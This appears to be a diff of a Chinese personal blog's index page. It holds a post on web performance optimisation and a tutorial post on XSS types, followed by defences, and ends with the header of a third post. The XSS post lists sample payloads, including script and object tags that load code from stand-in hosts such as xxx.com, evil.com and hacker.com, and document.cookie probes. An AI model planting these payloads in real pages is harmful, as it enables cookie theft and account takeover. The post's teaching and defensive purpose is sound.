+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%9AWhat--Why--How-/" class="post-title-link" itemprop="url">Web性能优化：What--Why--How-</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 12:58:00" itemprop="dateModified" datetime="2021-03-10T12:58:00+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><strong>为什么要提升Web性能？</strong></p>
+<p>Web性能黄金准则：只有10% ~ 20%的最终用户响应时间花在了下载html文档上，其余的80%~90%时间花在了下载页面组件上。</p>
+<p>web性能对于用户体验有及其重要的影响，根据著名的<code>2-5-8</code>原则：</p>
+<ul>
+<li>  当用户在2秒以内得到响应，会感觉系统的响应非常快；</li>
+<li>  当用户在2-5秒之内得到响应，会感觉系统的响应速度还可以；</li>
+<li>  当用户在5-8秒之内得到响应，会感觉系统的响应非常慢，但还可以接受；</li>
+<li>  当用户在8秒之后都没有得到响应，会感觉系统糟透了，甚至系统已经挂掉；要么打开竞争对手的网站，要么重新发起第二次请求。</li>
+</ul>
+<p>凡事都需要研究，通过科学的研究我们就可以找到事物的发展规律。这里要感谢雅虎的工程师总结的14条前端优化法则，使得我们可以站在巨人的肩膀上。《高性能网站建设》这本书中的14条优化原则，总结起来主要是以下个方面的优化：</p>
+<ol>
+<li> 减少HTTP请求</li>
+<li> 页面内部优化</li>
+<li> 启用缓存</li>
+<li> 减少下载量</li>
+<li> 网络连接上的优化</li>
+</ol>
+<p><strong>为什么减少HTTP请求可以提高Web性能？</strong></p>
+<p>要回答这个问题，我们就要了解当浏览器向服务器发送一个http请求知道获取数据都经历哪些过程：</p>
+<p><code>开启一个链接（tcp/ip的三次握手过程）</code>-》<code>发送请求</code>-》<code>等待（网络延迟跟服务器的处理时间）</code>-》<code>下载数据</code></p>
+<p>我们看一下百度首页中的http请求在各阶段耗费的时间，上面不同的颜色代表下图中的不同阶段</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-469e68be49a621d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p>可以看到除了图片之外，其余大部分http请求的事件花在了建立连接与等待阶段。</p>
+<p>http协议建立在TIC/IP协议之上，在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。 简单来说三次握手就是一个身份确认的过程：</p>
+<p>（第一次握手：主机A发送位码为syn＝1,随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；）</p>
+<blockquote>
+<p>晴儿：你是潇哥哥吗，我是晴儿</p>
+</blockquote>
+<p>（第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1),syn=1,ack=1,随机产生seq=7654321的包）</p>
+<blockquote>
+<p>潇剑：这货是谁，一箫一剑走江湖，下一句是什么？</p>
+</blockquote>
+<p>（第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1,以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1),ack=1,主机B收到后确认seq值与ack=1则连接建立成功。）</p>
+<blockquote>
+<p>晴儿：这首诗。。。你真的是潇哥哥，一萧一剑走江湖，千古情愁酒一回。。。<br>潇剑：晴儿，你真的是晴儿。。。。</p>
+</blockquote>
+<p>言归正传，这个过程也是需要消耗时间的，在百度首页找到一个极端的例子：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bbac62a159ab0da2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p>而等待的时间通常也大于内容下载的时间，这里同样找到一个极端例子：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a6459d697485c351.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p>由此我们可以得出结论：<strong>一个http请求绝大多数的时间消耗在了建立连接跟等待的时间，优化的方法是减少http请求</strong>。</p>
+<p><strong>如何提高web性能？</strong></p>
+<p><strong>1、减少HTTP请求</strong></p>
+<p>一般来说要减少http请求通常从两个方面下手：减少图片的请求、减少脚本文件与样式表的请求</p>
+<p>图片的减少通常有两种方式：<strong>css sprites、内联图片、IconFont</strong></p>
+<p><strong>CSS Sprites：</strong>将多张图片合并成一幅单独的图片，使用css的<code>background-position</code>属性，将html元素的背景图片放到<code>sprites</code> 图片中的期望位置上。使用这项技术的附加优点是他降低了下载量，合并后的图片比分离的图片和更小，因为它降低了图片自身的开销（颜色表、格式信息等等）。实际项目中<code>css sprites</code>是一项体力活，因为开发过程中需要对这张大图进行维护（添加、减少图片），张鑫旭同学的文章中有介绍如何管理sprites图片可以作为参考（**<a target="_blank" rel="noopener" href="http://www.zhangxinxu.com/wordpress/2010/07/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%AF%B9%E7%BD%91%E7%AB%99css%E8%BF%9B%E8%A1%8C%E6%9E%B6%E6%9E%84%E7%9A%84/">这里</a>**）。如果需要在页面中为背景、链接、导航栏提供大量的图片，css sprites绝对是一种优秀的解决方案（干净的标签、较少的图片、较短的响应时间）。</p>
+<p><strong>内联图片：</strong>通过使用<code>data:URL</code>模式可以再页面中包含图片而无需任何额外的请求。缺点就是IE8以下的浏览器不支持这种方式，而IE8在数据大小上有限制，只能支持23kb以内的数据。对于较小的图片来说可以直接内联到web页面中，但对于大图片内联到页面里会导致页面变大，聪明的做法是使用css，将内联的图片作为背景使用，并放到外部样式表中，这意味着数据可以缓存在样式表内部。使用外部样式表虽然增加了一个http请求，但样式可以被浏览器缓存，得到额外的收获。另外一点需要注意：base64是有损压缩。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1529134452b007f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p><strong>IconFont：</strong>图标字体，这是近年来新流行的一种以字体代替图片的技术。它可以适应任何分辨率而不会出现图片模糊问题，与图片相比它具有更小的容量，更高的灵活性（像字体一样可以设置图标大小、颜色、透明度、hover状态、反转等），IE8以上的浏览器都支持该技术。在使用IconFont之前，你首先要确定你选则的字体库是否是收费。详细内容可以参考这篇文章：图标字体化浅谈（<strong>isux.tencent.com/icon-font.html</strong>）</p>
+<p>减少脚本与样式表的请求主要原则就是合并。在实际开发中我们遵循模块化的原则将代码分散到许多小文件中，按照软件开发的原则这是完全正确的，但对于上线页面来说，每一个文件都会产生一个http请求，严重影响性能。和<code>css sprites</code>一样，将这些小文件合并到一个文件中，可以减少http请求的数量并缩短最终用户响应时间。在合并过程中我们还需要使用工具精简（移除不必要的字符以减小文件大小缩减下载时间）和混淆（除了移除不必要字符外，还会改写源代码，比如函数和变量名使用更短的标量名）Javascript代码。对于采用AMD或CMD进行模块化开发的同学，在合并过程中通常会将依赖的其他模块打包到一个文件中，而模板html通常以字符串的方式内联到Javascript文件中。目前最常用的前端构建工具就是glup，这里有一篇初步应用的文章：<strong>前端 | gulp 打包 require.js 模块依赖：segmentfault.com/a/1190000002876583</strong></p>
+<p><strong>2、页面内部优化</strong></p>
+<p>关于页面内部优化主要方向：样式表放在顶部、脚本文件放在底部、避免css表达式、把脚本的样式表放在外部、移除重复脚本。</p>
+<p>关心性能的工程师都希望页面能否尽快的展现在用户面前，对于页面中很多内容的页面我们都希望内容能够逐步加载，为用户提供可视化回馈。而将样式表放在底部会导致浏览器阻止内容逐步呈现。为避免当页面变化时重绘页面元素，浏览器会阻塞页面呈现，直到样式表解析完毕。所以如果将样式表放在顶部并不会减少资源的加载时间，它减少的是页面的呈现时间。小米主页曾经犯过这样的错误：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-403007190406e364.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p>将样式表放在底部会阻塞页面的逐步呈现，而将script文件放在页面顶部同样会阻塞页面的逐步呈现。script元素会阻塞后续内容的解析，因为script中可以同过<code>document.write</code>来更改页面。解决的办法就是将script标签放在页面底部。这样既可以让内容逐步呈现，也可以提高下载的并行度。如果我们确定不需要<code>document.write</code>那可以为<code>script</code>标签加上<code>asyn</code>属性（Ie中要加上<code>defer</code>）提高并行下载度。</p>
+<p>CSS表达式是ie支持的可以用来动态更改css属性的一种方式，我们不需要了解太多，她的书写方式如下，一旦在产品中发现<code>expression</code>关键字就要彻底消灭。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8b343d87b3131508.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p>使用外部脚本和样式这一条，我想凡是有点经验的工程师都会这么干。</p>
+<p><strong>移除重复脚本：</strong>这条说的主要是避免在页面中多次加入同一份Javascript代码，如果我们的开发中有依赖管理的方式比如AMD、CMD，基本不会出现这种情况。</p>
+<p><strong>3、启用缓存</strong></p>
+<p>关于缓存的使用这里介绍两套方案：<code>expires/If-Modified-Since</code>、<code>Cache-Control/Etag</code>；前者是HTTP1.0中的缓存方案，后者是HTTP1.1中缓存方案，若http头部中同时出现二者，后者的优先级更高。</p>
+<p><code>If-modified-since</code>的方式通常被称为条件Get。浏览器缓存中保存了一个文件的副本，但需要向服务器询问此副本是否可用。If-<code>Modified-Since</code>是浏览器将最后修改时间发送给服务器，服务器相应头中<code>Last-Modified</code>进行对比；若<code>If-Modified-Since &lt;= Last-Modified</code> 则浏览器读取本地副本。此时响应状态为<code>304 Not Modified</code>, 并不在发送响应体。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-097f40bfddb7254f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p><strong>Expries：</strong>虽然使用条件GET和304响应能够节省时间，但浏览器跟服务器端仍然要发送一次请求进行确认。通过明确设置副本的过期时间可以避免条件GET。当浏览器发现响应头中的expires时，会将过期时间和文件一起保存到缓存中去。在过期之前一直从缓存中读取。expires头使用一个特定的时间来指定缓存的有效期，他要求浏览器与服务器时间完全一致。而且一旦过期，服务器端配置中需要重新设顶一个过期时间。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ff24306e0e0d8654.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p><strong>ETag（实体标签）：</strong>是服务器用于检查浏览器缓存有效性的一种机制。ETag在HTTP1.1中引入，ETag是唯一标识了一个组件的一个特定版本的字符串。唯一的格式约束是这个字符串必须使用双引号。如果浏览器要验证一个组件是否有效他会使用<code>If-None-Match</code>将etag字符串传送给服务器。如果ETag是匹配的，服务器端会返回304.（如果实体数据需要根据<code>User-Agent</code>或<code>Accept-Language</code>来改变时，ETag提供了更高的灵活性）。对于使用服务器集群的网站来说，从一台服务器到另一台服务器，ETag通常是无法匹配的。这是ETag的问题。而且即便同时使用<code>If-Modified-Since</code>和<code>If-None-Match</code>也并不能达到预期效果。解决方法总是有的：<strong>自定义Etag格式</strong></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d897481f20db04c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p><strong>Cache-Control：</strong> HTTP1.1引入了来代替Expires，它使用<code>max-age</code>指令来指定副本被缓存多久，该指令以秒为单位定义了一个更新窗，组件从被请求开始到现在的秒数小于设定值，则一直使用副本。避免了一次http请求。相比Expries，<code>Cache-Control</code>指令提供了更细粒度的控制。详细内容请看大额同学的文章：<strong>透过浏览器看HTTP缓存 （cnblogs.com/skylar/p/browser-http-caching.html）</strong></p>
+<p><strong>4、减少下载量</strong></p>
+<p>减少下载量最有效的方式就是开启gzip压缩，gzip是GNU开发的一种免费格式。压缩组件通过减小http响应的大小来加快响应速度。HTTP1.1通过使用Accept-Encoding来标识支持的压缩，如果服务器看到这个标识，会使用请求头中的一种方式来压缩响应。并通过Content-Encoding来通知web客户端。很多网站会压缩html文件，实际上包括xml跟json在内的任何文本都可以压缩，但图片和pdf不应该压缩。根据经验通常可以对大于1kb或2kb的文件进行压缩。压缩通常能将响应的数据量减少70%。压缩的成本在于：服务器需要耗费额外的cpu进行压缩，客户端需要解压缩。所以需要在cpu的消耗和数据块的大小之间进行取舍。</p>
+<p><strong>5、优化网络连接</strong></p>
+<p>网络连接的优化主要有三个规则：使用CDN加速、减少DNS查找、避免重定向。</p>
+<p><strong>CDN：</strong> CDN是地理上分布的web server的集合，用于更高效地发布内容。通常基于网络远近来选择给具体用户服务的web server。这缩短了资源的传输响应时间，有效提高web性能。</p>
+<p>DNS用于映射主机名和IP地址，一般一次解析需要20～120毫秒。浏览器会首先根据页面的主机名进行域名解析，在有ISP返回结果之前页面不会加载任何内容，所以减少DNS查找可以有效降低等待时间。为达到更高的性能，DNS解析通常被多级别地缓存，如由ISP或局域网维护的caching server，本地机器操作系统的缓存（如windows上的DNS Client Service），浏览器。IE的缺省DNS缓存时间为30分钟，Firefox的缺省缓冲时间是1分钟。我们能做的是尽量减少一个页面的主机名，但要在浏览器最大并行下载数跟dns查找之间做权衡。根据雅虎的研究，最好将主机名控制在2-4个内。</p>
+<p><strong>重定向：</strong>将一个URL重新路由到另一个URL。重定向功能是通过301和302这两个HTTP状态码完成的，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently </span><br><span class="line">Location: http:&#x2F;&#x2F;example.com&#x2F;newuri </span><br><span class="line">Content-Type: text&#x2F;html </span><br></pre></td></tr></table></figure>
+
+<p>浏览器自动重定向请求到Location指定的URL上，重定向的主要问题是降低了用户体验。种最耗费资源、经常发生而很容易被忽视的重定向是URL的最后缺少<code>/</code>，导致自动产生结尾斜线的原因是，浏览器在进行<code>get</code>请求是必须指定一些路径；如果没有路径它就会简单的使用文档根。（主机缺少结尾斜线是不会发生重定向：<code>http://www.baidu.com</code>）缺少结尾斜线发生重定向是很多web服务器的默认行为。需要在服务器端设置方可消除。以下图片是豆瓣的一个url请求：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-01bec0dc2946afaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Web性能优化：What?Why?How?_"></p>
+<p>雅虎的14条优化规则在很长的一段时间里发挥着重要作用，随着技术的发展，单单这十四条原则已经不能够满足前端性能优化。在一些大公司出现了前端工程化这一概念，详细内容可以参考一下这篇文章：<strong>前端性能优化工程化进阶（trock.lofter.com/post/117023_19bb9bb）</strong></p>
+<blockquote>
+<p>文章源自：cnblogs.com/dojo-lzz/p/4591446.html</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A7%A3%E5%86%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/XSS(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC)%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A7%A3%E5%86%B3/" class="post-title-link" itemprop="url">XSS(跨站脚本)漏洞及解决</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:11:31" itemprop="dateModified" datetime="2021-03-10T13:11:31+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="xss是什么"><a href="#xss是什么" class="headerlink" title="xss是什么"></a>xss是什么</h2><p>xss跨站脚本攻击(Cross Site Scripting)，是一种经常出现在web应用中的计算机安全漏洞，它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入的恶意html代码会被执行，从而达到恶意用户的特殊目的。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d5e55ef5a0ced4ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<p><strong>本质：</strong>浏览器把输入数据插<code>入页面</code>中，当成<code>脚本执行</code>;<br><strong>XSS分为：</strong></p>
+<ul>
+<li>存储型 <pre><code>存储区域在后端数据库，插入点在HTML
+</code></pre>
+</li>
+<li>反射型<br>存储区域在URL，插入点在HTML</li>
+<li>DOM型XSS<br>存储区域在数据库、前端存储、URL都可能发生；插入点在javascript<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2></li>
+<li>1、攻击者构造出特殊的 URL，其中包含恶意代码。 </li>
+<li>2、攻击者诱使用户点击链接，恶意代码被拼接到 HTML 中返回给浏览<br>器。 </li>
+<li>3、浏览器解析执行。</li>
+<li>4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调用目标网站接口执行攻击者指定的操作。</li>
+</ul>
+<blockquote>
+<p>常⻅于用户登陆、数据搜索等位置</p>
+</blockquote>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul>
+<li>1、攻击者构造恶意代码，并提交保存到数据库。 </li>
+<li>2、用户打开应用，从数据库读取恶意代码，拼接到 HTML 中返回给浏览<br>器。</li>
+<li>3、浏览器解析执行。</li>
+<li>4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调用目标网站接口执行攻击者指定的操作。<blockquote>
+<p>常⻅于如论坛发帖、商品评论、用户信息修改等</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><ul>
+<li>1、攻击者构造出特殊的 URL，其中包含恶意代码。</li>
+<li>2、攻击者诱使用户点击链接。 </li>
+<li>3、浏览器解析执行，前端取出 URL 中的恶意代码并执行。</li>
+<li>4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调&gt;用目标网站接口执行攻击者指定的操作。<h2 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h2></li>
+<li><script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;xss.js&gt;&lt;&#x2F;script&gt;  #引用外部的xss</span><br><span class="line">&lt;script&gt; alert(&quot;hack&quot;)&lt;&#x2F;script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt; #弹出cookie</span><br></pre></td></tr></table></figure>
+<img>标签：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(&#x2F;hack&#x2F;)&gt;</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">&lt;img  src&#x3D;1  onerror&#x3D;alert(123)&gt;      注：对于数字，可以不用引号</span><br><span class="line">&lt;img  src&#x3D;&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br><span class="line">&lt;img  dynsrc&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line">&lt;img  lowsrc&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><body>标签：可以使用onload属性或其他更加模糊的属性（如属性）在标记内部传递XSS有效内容background
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload&#x3D;alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;body background&#x3D;&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><iframe>标签：该<iframe>标签允许另一个HTML网页的嵌入到父页面。
+`IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段`
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;”http:&#x2F;&#x2F;evil.com&#x2F;xss.html”&gt;</span><br></pre></td></tr></table></figure></li>
+<li><input>标签：在某些浏览器中，如果标记的type属性<input>设置为image，则可以对其进行操作以嵌入脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;image&quot; src&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><link>标签：<link>标签，这是经常被用来连接外部的样式表可以包含的脚本
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><table>标签：可以利用和标签的background属性来引用脚本而不是图像
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;td background&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><div>标签：该<div>标签，类似于<table>和<td>标签也可以指定一个背景，因此嵌入的脚本。
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><object>标签：该<object>标签可用于从外部站点脚本包含<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object type&#x3D;&quot;text&#x2F;x-scriptlet&quot; data&#x3D;&quot;http:&#x2F;&#x2F;hacker.com&#x2F;xss.html&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>利用模板引擎<br>模板引擎一般自带转义，需尽量保持最新，避免低版本漏洞</li>
+<li>避免内联事件<br>尽量不要用onLoad=“onload(‘’)”<br>onClick=“go(‘’)” 这种写法</li>
+<li>避免拼接 HTML<br>使用成熟的渲染框架，并保持新版本+后端过滤，如vue，angular等<br>使用成熟的过滤器，并保持新版本，如ESAPI，Dompurify等</li>
+<li>增加攻击难度，降低攻击后果<br>严格白名单、规范的CSP、限制⻓度、http-only等</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/dependencies-devDependencies-peerDependencies-optionalDependencies-bun/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/dependencies-devDependencies-peerDependencies-optionalDependencies-bun/" class="post-title-link" itemprop="url">dependencies-devDependencies-peerDependencies-optionalDependencies-bun</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:17:22" itemprop="dateModified" datetime="2021-03-10T13:17:22+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
